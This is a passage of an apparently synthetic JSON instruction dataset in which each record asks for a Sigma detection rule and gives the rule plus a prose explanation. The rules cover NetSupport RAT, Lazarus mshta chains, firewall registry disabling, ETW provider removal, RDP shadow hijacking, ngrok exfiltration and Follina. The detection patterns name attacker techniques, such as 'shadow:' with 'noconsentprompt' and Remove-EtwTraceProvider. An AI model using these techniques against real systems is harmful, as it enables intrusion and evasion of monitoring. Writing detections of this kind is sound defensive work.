      "answer": "In order to detect when a user account is locked out, you should monitor Okta logs for statements indicating that the maximum number of sign-in attempts has been exceeded. Specifically, look for log entries where the display message states \"Max sign in attempts exceeded\". This activity is tagged with the MITRE ATT&CK tactics and techniques associated with credential access attempts, as excessive failed login attempts could indicate an attacker trying to gain access to an account through brute force or guessing passwords. It is worth noting that some entries might be false positives, as the reason for unknown failed attempts could be legitimate users forgetting their passwords. The severity level for this activity is considered medium, underscoring the importance of investigating such incidents to determine if they are malicious attempts at accessing user accounts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of client32.exe (NetSupport RAT) from an unusual location (outside of 'C:\\Program Files').\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of client32.exe (NetSupport RAT) from an unusual location (outside of 'C:\\Program Files'), you should monitor process creation logs on Windows devices for the execution of 'client32.exe', specifically related to the NetSupport Remote Control product. This involves looking for process executions where the image name ends with '\\client32.exe', the product name contains 'NetSupport Remote Control', or the original file name contains 'client32.exe'. Additionally, the detection focuses on identifying a specific import hash (imphash) 'a9d50692e95b79723f3e76fcf70d023e', which is unique to a particular version of this malicious software, or checking for any hashes that contain this specific imphash value.\n\nIt is crucial to filter out legitimate instances of 'client32.exe' running from expected locations, such as 'C:\\Program Files' or 'C:\\Program Files (x86)', to reduce false positives. The goal is to catch only those instances where the executable is running from an unusual location that might indicate a compromise or unauthorized installation of the NetSupport Remote Access Tool (RAT), which could be used by attackers for control or exfiltration of data.\n\nThis detection strategy aligns with identifying tactics and techniques that involve executing code (Execution tactic) and the use of software packaging commonly associated with remote access tools (Application Layer Protocol technique). It is rated at a medium level of concern due to the potential for false positives, where unknown or unexpected but legitimate uses of 'client32.exe' outside of the standard directories may occur.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\client32.exe'\n        - Product|contains: 'NetSupport Remote Control'\n        - OriginalFileName|contains: 'client32.exe'\n        - Imphash: a9d50692e95b79723f3e76fcf70d023e\n        - Hashes|contains: IMPHASH=a9d50692e95b79723f3e76fcf70d023e\n    filter:\n        Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\client32.exe'\n        - Product|contains: 'NetSupport Remote Control'\n        - OriginalFileName|contains: 'client32.exe'\n        - Imphash: a9d50692e95b79723f3e76fcf70d023e\n        - Hashes|contains: IMPHASH=a9d50692e95b79723f3e76fcf70d023e\n    filter:\n        Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of client32.exe (NetSupport RAT) from an unusual location (outside of 'C:\\Program Files')",
      "answer": "In order to detect execution of client32.exe (NetSupport RAT) from an unusual location (outside of 'C:\\Program Files'), you should monitor process creation logs on Windows devices for the execution of 'client32.exe', specifically related to the NetSupport Remote Control product. This involves looking for process executions where the image name ends with '\\client32.exe', the product name contains 'NetSupport Remote Control', or the original file name contains 'client32.exe'. Additionally, the detection focuses on identifying a specific import hash (imphash) 'a9d50692e95b79723f3e76fcf70d023e', which is unique to a particular version of this malicious software, or checking for any hashes that contain this specific imphash value.\n\nIt is crucial to filter out legitimate instances of 'client32.exe' running from expected locations, such as 'C:\\Program Files' or 'C:\\Program Files (x86)', to reduce false positives. The goal is to catch only those instances where the executable is running from an unusual location that might indicate a compromise or unauthorized installation of the NetSupport Remote Access Tool (RAT), which could be used by attackers for control or exfiltration of data.\n\nThis detection strategy aligns with identifying tactics and techniques that involve executing code (Execution tactic) and the use of software packaging commonly associated with remote access tools (Application Layer Protocol technique). It is rated at a medium level of concern due to the potential for false positives, where unknown or unexpected but legitimate uses of 'client32.exe' outside of the standard directories may occur."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect anyone attempting a backup for the DPAPI Master Key, which is an event generated at the source and not the Domain Controller, you should monitor security logs from Windows systems for the event ID 4692. This specific event ID is triggered when there's an attempt to backup the Data Protection API (DPAPI) Master Key. Pay particular attention to fields such as ComputerName, SubjectDomainName, and SubjectUserName within these logs to help identify the source and context of the attempt. It's worth noting that false positives may occur if a computer is part of a domain because DPAPI employs a backup mechanism to allow unprotection of the data, which can trigger this event. The risk level associated with this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4692\n    condition: selection\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\nfalsepositives:\n    - If a computer is a member of a domain, DPAPI has a backup mechanism to allow unprotection of the data. Which will trigger this event.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4692\n    condition: selection\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\nfalsepositives:\n    - If a computer is a member of a domain, DPAPI has a backup mechanism to allow unprotection of the data. Which will trigger this event.\nlevel: medium\n",
      "question": "anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.",
      "answer": "In order to detect anyone attempting a backup for the DPAPI Master Key, which is an event generated at the source and not the Domain Controller, you should monitor security logs from Windows systems for the event ID 4692. This specific event ID is triggered when there's an attempt to backup the Data Protection API (DPAPI) Master Key. Pay particular attention to fields such as ComputerName, SubjectDomainName, and SubjectUserName within these logs to help identify the source and context of the attempt. It's worth noting that false positives may occur if a computer is part of a domain because DPAPI employs a backup mechanism to allow unprotection of the data, which can trigger this event. The risk level associated with this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting different process creation events as described in Malwarebytes's threat report on Lazarus group activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect different process creation events as described in Malwarebytes's threat report on Lazarus group activity, you should: Look for the creation of processes in Windows environments, specifically focusing on three primary patterns that indicate potentially malicious activity. The first pattern involves the use of the 'mshta' command line utility in conjunction with '.zip' files, which can be indicative of an attempt to execute scripts or HTML applications, typical in various attack scenarios. The second pattern to be vigilant of includes processes spawned by 'C:\\Windows\\System32\\wbem\\wmiprvse.exe' that then launch 'C:\\Windows\\System32\\mshta.exe', hinting at a suspicious parent-child process relationship often used for executing malicious HTA files. Lastly, observe for instances where 'C:\\Windows\\System32\\rundll32.exe' is launched by any process residing within the 'C:\\Users\\Public\\' directory path, as this is a common tactic employed for stealthy code execution. Given the high level of potential threat associated with these patterns, they are deemed highly reliable indicators of compromise with no expected false positives. The methods of detection align with tactics and techniques related to Execution, Persistence, Privilege Escalation, and Defense Evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - 'mshta' # Covered by cc7abbd0-762b-41e3-8a26-57ad50d2eea3\n            - '.zip'\n    selection_2:\n        ParentImage: 'C:\\Windows\\System32\\wbem\\wmiprvse.exe' # Covered by 8a582fe2-0882-4b89-a82a-da6b2dc32937\n        Image: 'C:\\Windows\\System32\\mshta.exe'\n    selection_3:\n        ParentImage|contains: ':\\Users\\Public\\'\n        Image: 'C:\\Windows\\System32\\rundll32.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Should not be any false positives\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - 'mshta' # Covered by cc7abbd0-762b-41e3-8a26-57ad50d2eea3\n            - '.zip'\n    selection_2:\n        ParentImage: 'C:\\Windows\\System32\\wbem\\wmiprvse.exe' # Covered by 8a582fe2-0882-4b89-a82a-da6b2dc32937\n        Image: 'C:\\Windows\\System32\\mshta.exe'\n    selection_3:\n        ParentImage|contains: ':\\Users\\Public\\'\n        Image: 'C:\\Windows\\System32\\rundll32.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Should not be any false positives\nlevel: high\n",
      "question": "different process creation events as described in Malwarebytes's threat report on Lazarus group activity",
      "answer": "In order to detect different process creation events as described in Malwarebytes's threat report on Lazarus group activity, you should: Look for the creation of processes in Windows environments, specifically focusing on three primary patterns that indicate potentially malicious activity. The first pattern involves the use of the 'mshta' command line utility in conjunction with '.zip' files, which can be indicative of an attempt to execute scripts or HTML applications, typical in various attack scenarios. The second pattern to be vigilant of includes processes spawned by 'C:\\Windows\\System32\\wbem\\wmiprvse.exe' that then launch 'C:\\Windows\\System32\\mshta.exe', hinting at a suspicious parent-child process relationship often used for executing malicious HTA files. Lastly, observe for instances where 'C:\\Windows\\System32\\rundll32.exe' is launched by any process residing within the 'C:\\Users\\Public\\' directory path, as this is a common tactic employed for stealthy code execution. Given the high level of potential threat associated with these patterns, they are deemed highly reliable indicators of compromise with no expected false positives. The methods of detection align with tactics and techniques related to Execution, Persistence, Privilege Escalation, and Defense Evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries attempting to disable or modify system firewalls to bypass controls limiting network usage, you should monitor registry modifications targeting the Windows Firewall settings. This involves tracking events where registry values are set (EventType: SetValue) under the Windows product category, specifically within the Registry Set log source. Pay close attention to any changes made to the registry paths that control the enabling of the firewall in the domain, public, and standard profiles, which are found under \"HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\\" and end with \"\\EnableFirewall\". The critical modification to look out for is the setting of these registry values to 'DWORD (0x00000000)', which effectively disables the firewall. It's important to note that there could be rare cases where changes to these settings might not indicate malicious activity, and these should be considered as potential false positives. The severity of such modifications is generally considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\EnableFirewall\n        #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall\n        #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\EnableFirewall\n        TargetObject|startswith: 'HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\'\n        TargetObject|endswith: '\\EnableFirewall'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\EnableFirewall\n        #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall\n        #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\EnableFirewall\n        TargetObject|startswith: 'HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\'\n        TargetObject|endswith: '\\EnableFirewall'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage",
      "answer": "In order to detect adversaries attempting to disable or modify system firewalls to bypass controls limiting network usage, you should monitor registry modifications targeting the Windows Firewall settings. This involves tracking events where registry values are set (EventType: SetValue) under the Windows product category, specifically within the Registry Set log source. Pay close attention to any changes made to the registry paths that control the enabling of the firewall in the domain, public, and standard profiles, which are found under \"HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\\" and end with \"\\EnableFirewall\". The critical modification to look out for is the setting of these registry values to 'DWORD (0x00000000)', which effectively disables the firewall. It's important to note that there could be rare cases where changes to these settings might not indicate malicious activity, and these should be considered as potential false positives. The severity of such modifications is generally considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting password policy discovery commands.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect password policy discovery commands, you should focus on identifying specific actions captured by the Linux Audit Daemon (`auditd`). These actions are centered around the modification or query of files and commands that are crucial in defining or understanding the system's password policies. The monitoring should cover:\n\n1. Access or changes to critical configuration files that dictate password policies. These files include `/etc/pam.d/common-password`, `/etc/security/pwquality.conf`, `/etc/pam.d/system-auth`, and `/etc/login.defs`. Any activity involving these files should be scrutinized for potential unauthorized attempts to discover or alter password policies.\n\n2. Execution of the `chage` command with specific arguments `--list` or `-l`. The `chage` command is used to view or change user password expiry information. Utilization of this command with these arguments is indicative of an attempt to gather information about password aging policies.\n\n3. Execution of the `passwd` command with arguments `-S` or `--status`, which are used to display the account status information. This can point towards an attempt to understand or audit the strength and characteristics of current user passwords, essentially profiling the password policies in place.\n\nWhile monitoring these activities can indicate potential reconnaissance or unauthorized policy discovery attempts, it is also important to consider that they might originate from legitimate administration activities. As such, these detections are classified with a low level of confidence, suggesting that while they should be monitored, each identified action must be contextualized and validated against known administrative behaviors and practices to accurately determine malicious intent.\n\nRelevant detection tactics primarily relate to Discovery, as these actions aim at uncovering configurations and policies that dictate user password requirements and restrictions within the system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_files:\n        type: 'PATH'\n        name:\n            - '/etc/pam.d/common-password'\n            - '/etc/security/pwquality.conf'\n            - '/etc/pam.d/system-auth'\n            - '/etc/login.defs'\n    selection_chage:\n        type: 'EXECVE'\n        a0: 'chage'\n        a1:\n            - '--list'\n            - '-l'\n    selection_passwd:\n        type: 'EXECVE'\n        a0: 'passwd'\n        a1:\n            - '-S'\n            - '--status'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administration activities\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_files:\n        type: 'PATH'\n        name:\n            - '/etc/pam.d/common-password'\n            - '/etc/security/pwquality.conf'\n            - '/etc/pam.d/system-auth'\n            - '/etc/login.defs'\n    selection_chage:\n        type: 'EXECVE'\n        a0: 'chage'\n        a1:\n            - '--list'\n            - '-l'\n    selection_passwd:\n        type: 'EXECVE'\n        a0: 'passwd'\n        a1:\n            - '-S'\n            - '--status'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administration activities\nlevel: low\n",
      "question": "password policy discovery commands",
      "answer": "In order to detect password policy discovery commands, you should focus on identifying specific actions captured by the Linux Audit Daemon (`auditd`). These actions are centered around the modification or query of files and commands that are crucial in defining or understanding the system's password policies. The monitoring should cover:\n\n1. Access or changes to critical configuration files that dictate password policies. These files include `/etc/pam.d/common-password`, `/etc/security/pwquality.conf`, `/etc/pam.d/system-auth`, and `/etc/login.defs`. Any activity involving these files should be scrutinized for potential unauthorized attempts to discover or alter password policies.\n\n2. Execution of the `chage` command with specific arguments `--list` or `-l`. The `chage` command is used to view or change user password expiry information. Utilization of this command with these arguments is indicative of an attempt to gather information about password aging policies.\n\n3. Execution of the `passwd` command with arguments `-S` or `--status`, which are used to display the account status information. This can point towards an attempt to understand or audit the strength and characteristics of current user passwords, essentially profiling the password policies in place.\n\nWhile monitoring these activities can indicate potential reconnaissance or unauthorized policy discovery attempts, it is also important to consider that they might originate from legitimate administration activities. As such, these detections are classified with a low level of confidence, suggesting that while they should be monitored, each identified action must be contextualized and validated against known administrative behaviors and practices to accurately determine malicious intent.\n\nRelevant detection tactics primarily relate to Discovery, as these actions aim at uncovering configurations and policies that dictate user password requirements and restrictions within the system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an executable accessing ngrok.io, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an executable accessing ngrok.io, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors, you should: Monitor network connections on Windows systems for instances where a connection has been initiated to a destination hostname that ends with '.ngrok.io'. This analysis focuses on detecting potentially malicious activity, given that ngrok.io is commonly used for securely exposing a local web server to the internet, but it can also be leveraged by attackers for data exfiltration purposes. While this behavior may flag legitimate uses of ngrok.io, it is marked with a high level of caution due to the potential for misuse in bypassing network security measures and exfiltrating sensitive information. Therefore, any detection of such activity should be thoroughly investigated for indications of malicious behavior.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        DestinationHostname|endswith: '.ngrok.io'\n    condition: selection\nfalsepositives:\n    - Legitimate use of ngrok.io\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        DestinationHostname|endswith: '.ngrok.io'\n    condition: selection\nfalsepositives:\n    - Legitimate use of ngrok.io\nlevel: high\n",
      "question": "an executable accessing ngrok.io, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
      "answer": "In order to detect an executable accessing ngrok.io, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors, you should: Monitor network connections on Windows systems for instances where a connection has been initiated to a destination hostname that ends with '.ngrok.io'. This analysis focuses on detecting potentially malicious activity, given that ngrok.io is commonly used for securely exposing a local web server to the internet, but it can also be leveraged by attackers for data exfiltration purposes. While this behavior may flag legitimate uses of ngrok.io, it is marked with a high level of caution due to the potential for misuse in bypassing network security measures and exfiltrating sensitive information. Therefore, any detection of such activity should be thoroughly investigated for indications of malicious behavior."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity, you should: Focus on monitoring the creation of processes on Windows systems, especially looking out for instances where the ImagingDevices.exe process is initiated by or gives rise to suspicious processes. Specifically, be alert for the ImagingDevices.exe process being spawned by unexpected parent processes such as WmiPrvSE.exe, svchost.exe, or dllhost.exe. Additionally, it is crucial to remain vigilant for cases where ImagingDevices.exe itself acts as a parent to suspicious child processes. Though specifics on what constitutes a suspicious child process are not provided, typically, these would include command-line utilities or scripts like cmd or PowerShell that are not standard children of ImagingDevices.exe. Due to the high level of concern and potential for false positives being unknown, such detection efforts should be prioritized and investigated with due diligence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith: '\\ImagingDevices.exe'\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith: '\\ImagingDevices.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith: '\\ImagingDevices.exe'\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith: '\\ImagingDevices.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity",
      "answer": "In order to detect unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity, you should: Focus on monitoring the creation of processes on Windows systems, especially looking out for instances where the ImagingDevices.exe process is initiated by or gives rise to suspicious processes. Specifically, be alert for the ImagingDevices.exe process being spawned by unexpected parent processes such as WmiPrvSE.exe, svchost.exe, or dllhost.exe. Additionally, it is crucial to remain vigilant for cases where ImagingDevices.exe itself acts as a parent to suspicious child processes. Though specifics on what constitutes a suspicious child process are not provided, typically, these would include command-line utilities or scripts like cmd or PowerShell that are not standard children of ImagingDevices.exe. Due to the high level of concern and potential for false positives being unknown, such detection efforts should be prioritized and investigated with due diligence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of powershell cmdlets to disable or remove ETW trace sessions.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of powershell cmdlets to disable or remove ETW trace sessions, you should: Focus on monitoring PowerShell script actions within Windows environments, specifically looking for Script Block Logging entries. Ensure Script Block Logging is enabled for in-depth insight. Watch for specific patterns within the ScriptBlockText: the command 'Remove-EtwTraceProvider ' indicating an attempt to remove Event Tracing for Windows (ETW) trace providers, and sequences involving 'Set-EtwTraceProvider ' combined with '0x11', which are indicative of attempts to modify the \"Enable\" property of a provider, potentially disabling it. The detection strategy relies on catching either one of these behaviors as a sign of the attack. It is crucial to be vigilant for false positives, although they are currently unspecified. This monitoring stands at a high level of importance due to the nature of the actions being indicative of attempts to undermine system logging and monitoring capabilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_pwsh_remove:   #Autologger provider removal\n        ScriptBlockText|contains: 'Remove-EtwTraceProvider '\n    selection_pwsh_set:   #Provider \u201cEnable\u201d property modification\n        ScriptBlockText|contains|all:\n            - 'Set-EtwTraceProvider '\n            - '0x11'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_pwsh_remove:   #Autologger provider removal\n        ScriptBlockText|contains: 'Remove-EtwTraceProvider '\n    selection_pwsh_set:   #Provider \u201cEnable\u201d property modification\n        ScriptBlockText|contains|all:\n            - 'Set-EtwTraceProvider '\n            - '0x11'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of powershell cmdlets to disable or remove ETW trace sessions",
      "answer": "In order to detect usage of powershell cmdlets to disable or remove ETW trace sessions, you should: Focus on monitoring PowerShell script actions within Windows environments, specifically looking for Script Block Logging entries. Ensure Script Block Logging is enabled for in-depth insight. Watch for specific patterns within the ScriptBlockText: the command 'Remove-EtwTraceProvider ' indicating an attempt to remove Event Tracing for Windows (ETW) trace providers, and sequences involving 'Set-EtwTraceProvider ' combined with '0x11', which are indicative of attempts to modify the \"Enable\" property of a provider, potentially disabling it. The detection strategy relies on catching either one of these behaviors as a sign of the attack. It is crucial to be vigilant for false positives, although they are currently unspecified. This monitoring stands at a high level of importance due to the nature of the actions being indicative of attempts to undermine system logging and monitoring capabilities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting RDP session hijacking by using MSTSC shadowing.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect RDP session hijacking by using MSTSC shadowing, you should: Monitor the creation of processes on Windows systems for command lines that contain both 'noconsentprompt' and 'shadow:'. This detection aims to identify the tactics used for unauthorized control or viewing of Remote Desktop Protocol (RDP) sessions without the consent of the user. Alerting on such commands can signal an attempt at RDP session hijacking, a method often employed to gain remote access or maintain persistence in a compromised system. Given the high severity level, any detection of such activity should be investigated promptly to mitigate potential security breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'noconsentprompt'\n            - 'shadow:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'noconsentprompt'\n            - 'shadow:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "RDP session hijacking by using MSTSC shadowing",
      "answer": "In order to detect RDP session hijacking by using MSTSC shadowing, you should: Monitor the creation of processes on Windows systems for command lines that contain both 'noconsentprompt' and 'shadow:'. This detection aims to identify the tactics used for unauthorized control or viewing of Remote Desktop Protocol (RDP) sessions without the consent of the user. Alerting on such commands can signal an attempt at RDP session hijacking, a method often employed to gain remote access or maintain persistence in a compromised system. Given the high severity level, any detection of such activity should be investigated promptly to mitigate potential security breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation, you should: Monitor process creations within Windows systems for instances where `msdt.exe` is initiated. Specifically, look out for executions of `msdt.exe` that are children of certain programs known for scripting or command execution, such as `cmd.exe`, `cscript.exe`, `mshta.exe`, `powershell.exe`, `pwsh.exe`, `regsvr32.exe`, `rundll32.exe`, `schtasks.exe`, `wmic.exe`, `wscript.exe`, and `wsl.exe`. These parent processes are often used by attackers to execute malicious scripts or commands. To ensure effective detection, confirm that both the process image ends with `\\msdt.exe` and its original filename is identified as `msdt.exe` to reduce the chance of missing malicious activity. This monitoring is tagged under tactics and techniques such as Execution, Privilege Escalation, and Defense Evasion due to the nature of the exploit and the ways attackers leverage it to execute arbitrary commands, elevate privileges, or bypass security mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n            # Note: office applications are covered by: 438025f9-5856-4663-83f7-52f878a70a50\n    selection_msdt:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n            # Note: office applications are covered by: 438025f9-5856-4663-83f7-52f878a70a50\n    selection_msdt:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation",
      "answer": "In order to detect msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation, you should: Monitor process creations within Windows systems for instances where `msdt.exe` is initiated. Specifically, look out for executions of `msdt.exe` that are children of certain programs known for scripting or command execution, such as `cmd.exe`, `cscript.exe`, `mshta.exe`, `powershell.exe`, `pwsh.exe`, `regsvr32.exe`, `rundll32.exe`, `schtasks.exe`, `wmic.exe`, `wscript.exe`, and `wsl.exe`. These parent processes are often used by attackers to execute malicious scripts or commands. To ensure effective detection, confirm that both the process image ends with `\\msdt.exe` and its original filename is identified as `msdt.exe` to reduce the chance of missing malicious activity. This monitoring is tagged under tactics and techniques such as Execution, Privilege Escalation, and Defense Evasion due to the nature of the exploit and the ways attackers leverage it to execute arbitrary commands, elevate privileges, or bypass security mechanisms."
    }
  },
  {
